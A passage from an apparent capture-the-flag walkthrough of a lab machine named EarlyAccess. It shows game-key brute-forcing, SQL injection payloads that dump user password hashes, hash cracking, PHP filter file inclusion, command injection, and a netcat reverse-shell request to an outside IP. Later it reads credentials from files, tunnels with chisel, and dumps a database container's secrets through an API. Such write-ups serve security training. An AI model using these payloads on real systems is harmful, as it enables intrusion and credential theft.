[*] Key KEY68-2K2K2-XPZH0-GAMC8-1357 Magic Number 378 VALID
[*] Key KEY68-2K2K2-XPZI0-GAMC8-1358 Magic Number 379 VALID
[*] Key KEY68-2K2K2-XPZJ0-GAMC8-1359 Magic Number 380 VALID
[*] Key KEY68-2K2K2-XPZK0-GAMC8-1360 Magic Number 381 VALID
[*] Key KEY68-2K2K2-XPZL0-GAMC8-1361 Magic Number 382 VALID
[*] Key KEY68-2K2K2-XPZM0-GAMC8-1362 Magic Number 383 VALID
[*] Key KEY68-2K2K2-XPZN0-GAMC8-1363 Magic Number 384 VALID
[*] Key KEY68-2K2K2-XPZO0-GAMC8-1364 Magic Number 385 VALID
[*] Key KEY68-2K2K2-XPZP0-GAMC8-1365 Magic Number 386 VALID
[*] Key KEY68-2K2K2-XPZQ0-GAMC8-1366 Magic Number 387 VALID
[*] Key KEY68-2K2K2-XPZR0-GAMC8-1367 Magic Number 388 VALID
[*] Key KEY68-2K2K2-XPZS0-GAMC8-1368 Magic Number 389 VALID
[*] Key KEY68-2K2K2-XPZT0-GAMC8-1369 Magic Number 390 VALID
[*] Key KEY68-2K2K2-XPZU0-GAMC8-1370 Magic Number 391 VALID
[*] Key KEY68-2K2K2-XPZV0-GAMC8-1371 Magic Number 392 VALID
[*] Key KEY68-2K2K2-XPZW0-GAMC8-1372 Magic Number 393 VALID
[*] Key KEY68-2K2K2-XPZX0-GAMC8-1373 Magic Number 394 VALID
[*] Key KEY68-2K2K2-XPZY0-GAMC8-1374 Magic Number 395 VALID
[*] Key KEY68-2K2K2-XPZZ0-GAMC8-1375 Magic Number 396 VALID
[*] Key KEY68-2K2K2-XPZZ1-GAMC8-1376 Magic Number 397 VALID
[*] Key KEY68-2K2K2-XPZZ2-GAMC8-1377 Magic Number 398 VALID
[*] Key KEY68-2K2K2-XPZZ3-GAMC8-1378 Magic Number 399 VALID
[*] Key KEY68-2K2K2-XPZZ4-GAMC8-1379 Magic Number 400 VALID
[*] Key KEY68-2K2K2-XPZZ5-GAMC8-1380 Magic Number 401 VALID
[*] Key KEY68-2K2K2-XPZZ6-GAMC8-1381 Magic Number 402 VALID
[*] Key KEY68-2K2K2-XPZZ7-GAMC8-1382 Magic Number 403 VALID
[*] Key KEY68-2K2K2-XPZZ8-GAMC8-1383 Magic Number 404 VALID
[*] Key KEY68-2K2K2-XPZZ9-GAMC8-1384 Magic Number 405 VALID
```

Attempt to validate the generated keys against the admin key verification API itself by calling the `online_validation_test()` function. The key `KEY12-2K2K2-XPZT0-GAMD2-1353` is valid for the current server-side `magic_num` value.

```bash
$ python3 -W ignore validate-game-key.py
[1] Trying KEY12-2K2K2-XPAA0-GAMD2-1309
[2] Trying KEY12-2K2K2-XPBA0-GAMD2-1310
[3] Trying KEY12-2K2K2-XPCA0-GAMD2-1311
[4] Trying KEY12-2K2K2-XPDA0-GAMD2-1312
[5] Trying KEY12-2K2K2-XPEA0-GAMD2-1313
[6] Trying KEY12-2K2K2-XPFA0-GAMD2-1314
[7] Trying KEY12-2K2K2-XPGA0-GAMD2-1315
[8] Trying KEY12-2K2K2-XPHA0-GAMD2-1316
[9] Trying KEY12-2K2K2-XPIA0-GAMD2-1317
[10] Trying KEY12-2K2K2-XPJA0-GAMD2-1318
[11] Trying KEY12-2K2K2-XPKA0-GAMD2-1319
[12] Trying KEY12-2K2K2-XPLA0-GAMD2-1320
[13] Trying KEY12-2K2K2-XPMA0-GAMD2-1321
[14] Trying KEY12-2K2K2-XPNA0-GAMD2-1322
[15] Trying KEY12-2K2K2-XPOA0-GAMD2-1323
[16] Trying KEY12-2K2K2-XPPA0-GAMD2-1324
[17] Trying KEY12-2K2K2-XPQA0-GAMD2-1325
[18] Trying KEY12-2K2K2-XPRA0-GAMD2-1326
[19] Trying KEY12-2K2K2-XPSA0-GAMD2-1327
[20] Trying KEY12-2K2K2-XPTA0-GAMD2-1328
[21] Trying KEY12-2K2K2-XPUA0-GAMD2-1329
[22] Trying KEY12-2K2K2-XPVA0-GAMD2-1330
[23] Trying KEY12-2K2K2-XPWA0-GAMD2-1331
[24] Trying KEY12-2K2K2-XPXA0-GAMD2-1332
[25] Trying KEY12-2K2K2-XPYA0-GAMD2-1333
[26] Trying KEY12-2K2K2-XPZA0-GAMD2-1334
[27] Trying KEY12-2K2K2-XPZB0-GAMD2-1335
[28] Trying KEY12-2K2K2-XPZC0-GAMD2-1336
[29] Trying KEY12-2K2K2-XPZD0-GAMD2-1337
[30] Trying KEY12-2K2K2-XPZE0-GAMD2-1338
[31] Trying KEY12-2K2K2-XPZF0-GAMD2-1339
[32] Trying KEY12-2K2K2-XPZG0-GAMD2-1340
[33] Trying KEY12-2K2K2-XPZH0-GAMD2-1341
[34] Trying KEY12-2K2K2-XPZI0-GAMD2-1342
[35] Trying KEY12-2K2K2-XPZJ0-GAMD2-1343
[36] Trying KEY12-2K2K2-XPZK0-GAMD2-1344
[37] Trying KEY12-2K2K2-XPZL0-GAMD2-1345
[38] Trying KEY12-2K2K2-XPZM0-GAMD2-1346
[39] Trying KEY12-2K2K2-XPZN0-GAMD2-1347
[40] Trying KEY12-2K2K2-XPZO0-GAMD2-1348
[41] Trying KEY12-2K2K2-XPZP0-GAMD2-1349
[42] Trying KEY12-2K2K2-XPZQ0-GAMD2-1350
[43] Trying KEY12-2K2K2-XPZR0-GAMD2-1351
[44] Trying KEY12-2K2K2-XPZS0-GAMD2-1352
[45] Trying KEY12-2K2K2-XPZT0-GAMD2-1353
[*] Valid game key: KEY12-2K2K2-XPZT0-GAMD2-1353
```

Switch back to a regular user and link the key to the user's account.

![](images/Pasted%20image%2020220216162155.png)

---

## `http://game.earlyaccess.htb`

> SQL injection on the scoreboard

Now that the current user has successfully registered a game key, login with their credential at `http://game.earlyaccess.htb`. The landing page is `/game.php`, which allows users to play **Mamba**, view the scoreboard, and the global leaderboard.

![](images/Pasted%20image%2020220216162405.png)

### Scoreboard SQL Injection

The scoreboard at `/scoreboard.php` contains the current user's username, score, and timestamp of their best 10 scores.

According to `SingleQuoteMan` on the forum, their original username (which presumably contained a single quote) caused the scoreboard to malfunction. The support team responded to this by preventing users from *registering* usernames with invalid characters (single quotes included). However, the successful XSS attack from earlier indicates that invalid characters can be included in the username when updating it on the user profile page at `https://earlyaccess.htb/user/profile`.

After some experimentation, it appears the backend server leverages a query similar to the following to construct the scoreboard:

```sql
SELECT scoreboard.score, scoreboard.ts, scoreboard.username FROM scores where INSTR(scoreboard.username, '$USERNAME') ORDER BY scoreboard.score DESC LIMIT 11;
```

By changing the current user's username to `tgihf') OR 1=1;--`, the following SQL query is executed, causing the scores for all users to be rendered.

```sql
SELECT scoreboard.username, scoreboard.score, scoreboard.ts FROM scores where INSTR(scoreboard.username, 'tgihf') OR 1=1;--') ORDER BY scoreboard.score DESC LIMIT 11;
```

![](images/Pasted%20image%2020220216164159.png)

### Table Enumeration

The username `tgihf') UNION SELECT ALL TABLE_SCHEMA,TABLE_NAME,TABLE_CATALOG FROM information_schema.tables;--` reveals the database's tables. There is one non-standard database, `db`, containing three tables: `failed_logins`, `scoreboard`, and `users`.

![](images/Pasted%20image%2020220216171928.png)

### Column Enumeration - `users`

The username `tgihf') UNION SELECT DATA_TYPE,NULL,COLUMN_NAME FROM information_schema.columns WHERE TABLE_NAME = 'users';--` reveals `db.users`' columns. There are eight: `created_at`, `email`, `id`, `key`, `name`, `password`, `role`, and `updated_at`.

![](images/Pasted%20image%2020220216170135.png)

### Dumping `users`

The username `tgihf') UNION SELECT id,password,name FROM users;--` dumps all of the users' usernames and password hashes.

![](images/Pasted%20image%2020220216170641.png)

Each hash is 40 characters long, indicating they are likely SHA-1 hashes.

### Cracking the Hashes

```bash
$ cat mamba-users.txt
618292e936625aca8df61d5fff5c06837c49e491
d997b2a79e4fc48183f59b2ce1cee9da18aa5476
584204a0bbe5e392173d3dfdf63a322c83fe97cd
290516b5f6ad161a86786178934ad5f933242361
$ hashcat -m 100 mamba-users.txt rockyou.txt
618292e936625aca8df61d5fff5c06837c49e491:gameover
```

`admin`'s password is `gameover`.

---

## `http://dev.earlyaccess.htb`

> Local file inclusion & command injection to low-privilege shell on `webserver`

The password `gameover` can be used to login as `admin` on `http://dev.earlyaccess.htb`. The development web application has two features: `Hashing-Tools` and `File-Tools`.

![](images/Pasted%20image%2020220216172319.png)

### Hashing-Tools

This feature has two actions: hashing text and verifying that a hash matches a piece of text. Both have the option of `MD5`, `SHA-1` and `More coming soon!`, which produce the form values `md5`, `sha1`, and an empty string respectively.

#### Hash Action

Taking the MD5 hash of the text "blah" sends the following HTTP `POST` request.

```http
POST /actions/hash.php HTTP/1.1
Host: dev.earlyaccess.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 57
Origin: http://dev.earlyaccess.htb
Connection: close
Referer: http://dev.earlyaccess.htb/home.php?tool=hashing
Cookie: XSRF-TOKEN=eyJpdiI6IkJnUjkzN1BUSlRtMFZjS09WVlJtaHc9PSIsInZhbHVlIjoiZFJCS3c5eDlPZXJzS1V2S0ZyVTZxV3FGc0kySUkzTmpJcVBrOGFGV3RZMVhLSWtSYUViWmNLa29yL2c0VkNWWEh6YnpXL21YYjVZTzUrMFVSWTNHRDlRL2psQUFEeE83aHFuYzk5ZkFWT3AzaDY3VXJpcmF0Nm43eTVmVjZyTW8iLCJtYWMiOiI4NmM5NzFjY2MzNDc0ZGQ3MTZiYzk3NzgxNzU3N2NiMTA5OWUwYWEwYzM1OGI0MTUzMjA5NDRlMmVhNTI5OTc3In0%3D; earlyaccess_session=eyJpdiI6IlVDMDhnbFBobjF3c3JXWEFvOWdURXc9PSIsInZhbHVlIjoiQWdDTEYxRG9MNDBGQkMwOGQ2d290bFN4U2tMejY5dDI5UXROWjYwc1BEbFRCelcvSUZrd3NFcWtrcXdPQXYzeURCYjk1MVNEUmxiWlBYNVgvUFQ3emVKS2t0QVE0UXVLcmFOWHdZZFZ6V0ZYZS9JVHh5NVpLZFR1MWhHKy9pNTMiLCJtYWMiOiJhNDU3ZDFkOWRmYzcyZTliOWFkYzlmZmYwMDEzN2I3Y2NjNTEyZWU4YTcyODc1ZWYyZjQ5YmU3NTQ1YjRiMjg3In0%3D; PHPSESSID=16c4a8a50df5a5606f00a6dbadc599cc
Upgrade-Insecure-Requests: 1

action=hash&redirect=true&password=blah&hash_function=md5
```

This results in a redirect to `/home.php?tool=hashing` with the hash.

![](images/Pasted%20image%2020220216173129.png)

#### Verify Action

Verifying that the text "blah" matches the hash "6f1ed002ab5595859014ebf0951522d9" sends the following HTTP `POST` request.

```http
POST /actions/hash.php HTTP/1.1
Host: dev.earlyaccess.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 83
Origin: http://dev.earlyaccess.htb
Connection: close
Referer: http://dev.earlyaccess.htb/home.php?tool=hashing
Cookie: XSRF-TOKEN=eyJpdiI6IkJnUjkzN1BUSlRtMFZjS09WVlJtaHc9PSIsInZhbHVlIjoiZFJCS3c5eDlPZXJzS1V2S0ZyVTZxV3FGc0kySUkzTmpJcVBrOGFGV3RZMVhLSWtSYUViWmNLa29yL2c0VkNWWEh6YnpXL21YYjVZTzUrMFVSWTNHRDlRL2psQUFEeE83aHFuYzk5ZkFWT3AzaDY3VXJpcmF0Nm43eTVmVjZyTW8iLCJtYWMiOiI4NmM5NzFjY2MzNDc0ZGQ3MTZiYzk3NzgxNzU3N2NiMTA5OWUwYWEwYzM1OGI0MTUzMjA5NDRlMmVhNTI5OTc3In0%3D; earlyaccess_session=eyJpdiI6IlVDMDhnbFBobjF3c3JXWEFvOWdURXc9PSIsInZhbHVlIjoiQWdDTEYxRG9MNDBGQkMwOGQ2d290bFN4U2tMejY5dDI5UXROWjYwc1BEbFRCelcvSUZrd3NFcWtrcXdPQXYzeURCYjk1MVNEUmxiWlBYNVgvUFQ3emVKS2t0QVE0UXVLcmFOWHdZZFZ6V0ZYZS9JVHh5NVpLZFR1MWhHKy9pNTMiLCJtYWMiOiJhNDU3ZDFkOWRmYzcyZTliOWFkYzlmZmYwMDEzN2I3Y2NjNTEyZWU4YTcyODc1ZWYyZjQ5YmU3NTQ1YjRiMjg3In0%3D; PHPSESSID=16c4a8a50df5a5606f00a6dbadc599cc
Upgrade-Insecure-Requests: 1

action=verify&password=blah&hash=6f1ed002ab5595859014ebf0951522d9&hash_function=md5
```

This results in a redirect to `/home.php?tool=hashing`, which renders whether the hash matches the text.

![](images/Pasted%20image%2020220216173308.png)

### File-Tools

This feature's *UI* isn't implemented yet. However, its backend may be.

The hashing tool processes requests at `/actions/hash.php`. Perhaps the file tool similarly processes requests at `/actions/file.php`. Sending an HTTP `POST` request with no parameter to `/actions/file.php` results in a 500 Internal Server Error. The body indicates the need to specify a file. HTTP `GET` requests result in a similar response.

```http
HTTP/1.1 500 Internal Server Error
Date: Wed, 16 Feb 2022 23:03:46 GMT
Server: Apache/2.4.38 (Debian)
X-Powered-By: PHP/7.4.21
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 35
Connection: close
Content-Type: text/html; charset=UTF-8

<h1>ERROR:</h1>Please specify file!
```

Attempting to specify the known path `/etc/passwd` in common file parameters such as `f`, `file`, and `path` isn't successful.

Fuzz the web application to determine the parameter's name. It appears that the unsuccessful attempts result in response sizes of 357 characters, so ignore those. The only outlier is the parameter `filepath`.

```bash
$ patator http_fuzz method=GET url='http://dev.earlyaccess.htb/actions/file.php?FILE0=/etc/passwd' header='Cookie: XSRF-TOKEN=eyJpdiI6IkJnUjkzN1BUSlRtMFZjS09WVlJtaHc9PSIsInZhbHVlIjoiZFJCS3c5eDlPZXJzS1V2S0ZyVTZxV3FGc0kySUkzTmpJcVBrOGFGV3RZMVhLSWtSYUViWmNLa29yL2c0VkNWWEh6YnpXL21YYjVZTzUrMFVSWTNHRDlRL2psQUFEeE83aHFuYzk5ZkFWT3AzaDY3VXJpcmF0Nm43eTVmVjZyTW8iLCJtYWMiOiI4NmM5NzFjY2MzNDc0ZGQ3MTZiYzk3NzgxNzU3N2NiMTA5OWUwYWEwYzM1OGI0MTUzMjA5NDRlMmVhNTI5OTc3In0%3D; earlyaccess_session=eyJpdiI6IlVDMDhnbFBobjF3c3JXWEFvOWdURXc9PSIsInZhbHVlIjoiQWdDTEYxRG9MNDBGQkMwOGQ2d290bFN4U2tMejY5dDI5UXROWjYwc1BEbFRCelcvSUZrd3NFcWtrcXdPQXYzeURCYjk1MVNEUmxiWlBYNVgvUFQ3emVKS2t0QVE0UXVLcmFOWHdZZFZ6V0ZYZS9JVHh5NVpLZFR1MWhHKy9pNTMiLCJtYWMiOiJhNDU3ZDFkOWRmYzcyZTliOWFkYzlmZmYwMDEzN2I3Y2NjNTEyZWU4YTcyODc1ZWYyZjQ5YmU3NTQ1YjRiMjg3In0%3D; PHPSESSID=16c4a8a50df5a5606f00a6dbadc599cc' 0=/usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -x ignore:size=357
18:27:19 patator    INFO - Starting Patator 0.9 (https://github.com/lanjelot/patator) with python-3.9.8 at 2022-02-16 18:27 EST
18:27:20 patator    INFO -
18:27:20 patator    INFO - code size:clen       time | candidate                          |   num | mesg
18:27:20 patator    INFO - -----------------------------------------------------------------------------
18:27:34 patator    INFO - 500  411:89         0.068 | filepath                           |  1316 | HTTP/1.1 500 Internal Server Error
18:27:49 patator    INFO - Hits/Done/Skip/Fail/Size: 1/2588/0/0/2588, Avg: 88 r/s, Time: 0h 0m 29s
```

Passing `/etc/passwd` into `filepath` indicates that the web application is filtering `filepath` to ensure it only contains files from the current directory. After much experimentation, the filtering seems solid.

Passing a nonexistent file in the current directory (i.e., `blah.php`) into `filepath` renders an error message that indicates `file.php` is passing `filepath` into PHP's `require_once()` function.

```http
HTTP/1.1 200 OK
Date: Wed, 16 Feb 2022 23:47:44 GMT
Server: Apache/2.4.38 (Debian)
X-Powered-By: PHP/7.4.21
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 400
Connection: close
Content-Type: text/html; charset=UTF-8

<h2>Executing file:</h2><p>blah.php</p><br><br />
<b>Warning</b>:  require_once(blah.php): failed to open stream: No such file or directory in <b>/var/www/earlyaccess.htb/dev/actions/file.php</b> on line <b>19</b><br />
<br />
<b>Fatal error</b>:  require_once(): Failed opening required 'blah.php' (include_path='.:.') in <b>/var/www/earlyaccess.htb/dev/actions/file.php</b> on line <b>19</b><br />
```

According to PHP's [include() documentation](https://www.php.net/manual/en/function.include.php) (`include()` is conceptually related to `require_once()`), when a file is included, the parser switches from PHP parsing mode to HTML parsing mode. This means it will attempt to render the target file as HTML. However, if the file includes PHP tags, it will execute the code within those tags. In other words, `require_once()` will execute PHP files and read all others.

Unfortunately, there doesn't seem to be any files worth reading in the current directory except for the PHP source code files. Luckily, [PHP filters](https://www.php.net/manual/en/filters.php) can be passed to `require_once()` to transform the file's contents into another format instead of executing it. Use PHP's `convert.base64-encode` filter to return the base64-encoded the contents of `hash.php`.

```http
GET /actions/file.php?filepath=php://filter/convert.base64-encode/resource=hash.php HTTP/1.1
Host: dev.earlyaccess.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: XSRF-TOKEN=eyJpdiI6IkJnUjkzN1BUSlRtMFZjS09WVlJtaHc9PSIsInZhbHVlIjoiZFJCS3c5eDlPZXJzS1V2S0ZyVTZxV3FGc0kySUkzTmpJcVBrOGFGV3RZMVhLSWtSYUViWmNLa29yL2c0VkNWWEh6YnpXL21YYjVZTzUrMFVSWTNHRDlRL2psQUFEeE83aHFuYzk5ZkFWT3AzaDY3VXJpcmF0Nm43eTVmVjZyTW8iLCJtYWMiOiI4NmM5NzFjY2MzNDc0ZGQ3MTZiYzk3NzgxNzU3N2NiMTA5OWUwYWEwYzM1OGI0MTUzMjA5NDRlMmVhNTI5OTc3In0%3D; earlyaccess_session=eyJpdiI6IlVDMDhnbFBobjF3c3JXWEFvOWdURXc9PSIsInZhbHVlIjoiQWdDTEYxRG9MNDBGQkMwOGQ2d290bFN4U2tMejY5dDI5UXROWjYwc1BEbFRCelcvSUZrd3NFcWtrcXdPQXYzeURCYjk1MVNEUmxiWlBYNVgvUFQ3emVKS2t0QVE0UXVLcmFOWHdZZFZ6V0ZYZS9JVHh5NVpLZFR1MWhHKy9pNTMiLCJtYWMiOiJhNDU3ZDFkOWRmYzcyZTliOWFkYzlmZmYwMDEzN2I3Y2NjNTEyZWU4YTcyODc1ZWYyZjQ5YmU3NTQ1YjRiMjg3In0%3D; PHPSESSID=16c4a8a50df5a5606f00a6dbadc599cc
Upgrade-Insecure-Requests: 1
```

The resulting base64-decoded source code:

```php
<?php
include_once "../includes/session.php";

function hash_pw($hash_function, $password)
{
    // DEVELOPER-NOTE: There has gotta be an easier way...
    ob_start();
    // Use inputted hash_function to hash password
    $hash = @$hash_function($password);
    ob_end_clean();
    return $hash;
}

try
{
    if(isset($_REQUEST['action']))
    {
        if($_REQUEST['action'] === "verify")
        {
            // VERIFIES $password AGAINST $hash

            if(isset($_REQUEST['hash_function']) && isset($_REQUEST['hash']) && isset($_REQUEST['password']))
            {
                // Only allow custom hashes, if `debug` is set
                if($_REQUEST['hash_function'] !== "md5" && $_REQUEST['hash_function'] !== "sha1" && !isset($_REQUEST['debug']))
                    throw new Exception("Only MD5 and SHA1 are currently supported!");

                $hash = hash_pw($_REQUEST['hash_function'], $_REQUEST['password']);

                $_SESSION['verify'] = ($hash === $_REQUEST['hash']);
                header('Location: /home.php?tool=hashing');
                return;
            }
        }
        elseif($_REQUEST['action'] === "verify_file")
        {
            //TODO: IMPLEMENT FILE VERIFICATION
        }
        elseif($_REQUEST['action'] === "hash_file")
        {
            //TODO: IMPLEMENT FILE-HASHING
        }
        elseif($_REQUEST['action'] === "hash")
        {
            // HASHES $password USING $hash_function

            if(isset($_REQUEST['hash_function']) && isset($_REQUEST['password']))
            {
                // Only allow custom hashes, if `debug` is set
                if($_REQUEST['hash_function'] !== "md5" && $_REQUEST['hash_function'] !== "sha1" && !isset($_REQUEST['debug']))
                    throw new Exception("Only MD5 and SHA1 are currently supported!");

                $hash = hash_pw($_REQUEST['hash_function'], $_REQUEST['password']);
                if(!isset($_REQUEST['redirect']))
                {
                    echo "Result for Hash-function (" . $_REQUEST['hash_function'] . ") and password (" . $_REQUEST['password'] . "):<br>";
                    echo '<br>' . $hash;
                    return;
                }
                else
                {
                    $_SESSION['hash'] = $hash;
                    header('Location: /home.php?tool=hashing');
                    return;
                }
            }
        }
    }
    // Action not set, ignore
    throw new Exception("");
}
catch(Exception $ex)
{
    if($ex->getMessage() !== "")
        $_SESSION['error'] = htmlentities($ex->getMessage());

    header('Location: /home.php');
    return;
}
?>
```

Both the `verify` and `hash` actions pass the input `hash_function` and `password` parameters to the `hash_pw` function, which calls a function with the same name as the value of the `hash_function` variable with the `password` parameter. The general values of `hash_function` are either `md5` or `sha1`, which results in either `md5($password)` or `sha1($password)` being executed. The resultant hash is returned.

```php
function hash_pw($hash_function, $password)
{
    // DEVELOPER-NOTE: There has gotta be an easier way...
    ob_start();
    // Use inputted hash_function to hash password
    $hash = @$hash_function($password);
    ob_end_clean();
    return $hash;
}
```

In both the `verify` and `hash` actions, if the `debug` parameter is set, the user can specify an arbitrary `hash_function` value. Thus, if `debug` is set, the `hash_function` value of `system` and the `password` value of a `bash` command result in command execution as `www-data`.

```http
GET /actions/file.php?filepath=hash.php&action=hash&debug=true&hash_function=system&password=id HTTP/1.1
Host: dev.earlyaccess.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Origin: http://dev.earlyaccess.htb
Connection: close
Referer: http://dev.earlyaccess.htb/home.php?tool=hashing
Cookie: PHPSESSID=3012a4d5c37f5657582d464dfa3a33ff
Upgrade-Insecure-Requests: 1
```

```http
HTTP/1.1 200 OK
Date: Thu, 17 Feb 2022 13:52:44 GMT
Server: Apache/2.4.38 (Debian)
X-Powered-By: PHP/7.4.21
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 187
Connection: close
Content-Type: text/html; charset=UTF-8

<h2>Executing file:</h2><p>hash.php</p><br>Result for Hash-function (system) and password (id):<br><br>uid=33(www-data) gid=33(www-data) groups=33(www-data)<h2>Executed file successfully!
```

Start a reverse shell listener and leverage this injection to initiate a full reverse shell as `www-data` on `webserver`.

```http
GET /actions/file.php?filepath=hash.php&action=hash&debug=true&hash_function=system&password=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.14.109+443+>/tmp/f HTTP/1.1
Host: dev.earlyaccess.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Origin: http://dev.earlyaccess.htb
Connection: close
Referer: http://dev.earlyaccess.htb/home.php?tool=hashing
Cookie: PHPSESSID=3012a4d5c37f5657582d464dfa3a33ff
Upgrade-Insecure-Requests: 1
```

```bash
www-data@webserver:/var/www/earlyaccess.htb/dev/actions$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## `webserver`

> Lateral movement to `www-adm`, discovering leaked API credentials, & SSH access as `drew`

Situational awareness on `webserver` indicates several typical Linux executables missing on the system (i.e., `sudo`, `ip`). This is indicative that `webserver` is a container.

Listing `/home/`, it appears there is another user: `www-adm`. `admin@earlyaccess.htb`'s password, `gameover`, works for `www-adm`.

```bash
www-data@webserver:/dev/shm/tgihf$ su www-adm
Password:
www-adm@webserver:/dev/shm/tgihf$ id
uid=1000(www-adm) gid=1000(www-adm) groups=1000(www-adm)
```

The non-standard file `/home/www-adm/.wgetrc` contains the credential `api`:`s3CuR3_API_PW!`. `www-adm` must have been using this credentials to interact with the key verification API over HTTP.

```bash
www-adm@webserver:~$ cat ~/.wgetrc
user=api
password=s3CuR3_API_PW!
```

There appears to be an `api` container at IPv4 address `172.18.0.101`.

```bash
www-adm@webserver:/dev/shm/tgihf$ nc -v api 80
DNS fwd/rev mismatch: api != api.app_nw
api [172.18.0.101] 80 (http) : Connection refused
```

Transfer `chisel` to the target and establish a dynamic, reverse port forward tunnel from the attacking machine through the target.

```bash
$ ./chisel server --reverse --port 8000
2022/02/17 10:20:23 server: Reverse tunnelling enabled
2022/02/17 10:20:23 server: Fingerprint LzAozRttiXAeXYc3/JPzRgMZcVuhFZ5rf50ZrMkLyWU=
2022/02/17 10:20:23 server: Listening on http://0.0.0.0:8000
```

```bash
www-adm@webserver:~$ ./chisel client 10.10.14.109:8000 R:socks
2022/02/17 15:20:39 client: Connecting to ws://10.10.14.109:8000
2022/02/17 15:20:40 client: Connected (Latency 43.482124ms)
```

Scan `172.18.0.101` for open ports. It appears that port 5000 is open.

```bash
$ proxychains nmap -Pn -sT --top-ports 100 172.18.0.101
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-17 10:23 EST
Nmap scan report for 172.18.0.101
Host is up (0.17s latency).
Not shown: 99 closed tcp ports (conn-refused)
PORT     STATE SERVICE
5000/tcp open  upnp

Nmap done: 1 IP address (1 host up) scanned in 18.71 seconds
```

It indeed appears to be the HTTP key verification API. Apparently administrative users can "verify the database" using the `/check_db` endpoint. With the API port discovered, tear down the dynamic reverse port forward tunnel and query the API from `webserver`.

```bash
www-adm@webserver:~$ curl http://172.18.0.101:5000
{"message":"Welcome to the game-key verification API! You can verify your keys via: /verify/<game-key>. If you are using manual verification, you have to synchronize the magic_num here. Admin users can verify the database using /check_db.","status":200}
```

The `/check_db` endpoint requires HTTP authentication.

```bash
www-adm@webserver:~$ curl http://172.18.0.101:5000/check_db
Invalid HTTP-Auth!
```

Use the credential from `.wgetrc`, `api`:`s3CuR3_API_PW!`. The output is a large JSON object that describes the status of the `mysql` container. It appears to be from Docker's HTTP API.

```bash
www-adm@webserver:~$ curl -u 'api:s3CuR3_API_PW!' http://172.18.0.101:5000/check_db
{"message":{"AppArmorProfile":"docker-default","Args":["--character-set-server=utf8mb4","--collation-server=utf8mb4_bin","--skip-character-set-client-handshake","--max_allowed_packet=50MB","--general_log=0","--sql_mode=ANSI_QUOTES,ERROR_FOR_DIVISION_BY_ZERO,IGNORE_SPACE,NO_ENGINE_SUBSTITUTION,NO_ZERO_DATE,NO_ZERO_IN_DATE,PIPES_AS_CONCAT,REAL_AS_FLOAT,STRICT_ALL_TABLES"],"Config":{"AttachStderr":false,"AttachStdin":false,"AttachStdout":false,"Cmd":["--character-set-server=utf8mb4","--collation-server=utf8mb4_bin","--skip-character-set-client-handshake","--max_allowed_packet=50MB","--general_log=0","--sql_mode=ANSI_QUOTES,ERROR_FOR_DIVISION_BY_ZERO,IGNORE_SPACE,NO_ENGINE_SUBSTITUTION,NO_ZERO_DATE,NO_ZERO_IN_DATE,PIPES_AS_CONCAT,REAL_AS_FLOAT,STRICT_ALL_TABLES"],"Domainname":"","Entrypoint":["docker-entrypoint.sh"],"Env":["MYSQL_DATABASE=db","MYSQL_USER=drew","MYSQL_PASSWORD=drew","MYSQL_ROOT_PASSWORD=XeoNu86JTznxMCQuGHrGutF3Csq5","SERVICE_TAGS=dev","SERVICE_NAME=mysql","PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","GOSU_VERSION=1.12","MYSQL_MAJOR=8.0","MYSQL_VERSION=8.0.25-1debian10"],"ExposedPorts":{"3306/tcp":{},"33060/tcp":{}},"Healthcheck":{"Interval":5000000000,"Retries":3,"Test":["CMD-SHELL","mysqladmin ping -h 127.0.0.1 --user=$MYSQL_USER -p$MYSQL_PASSWORD 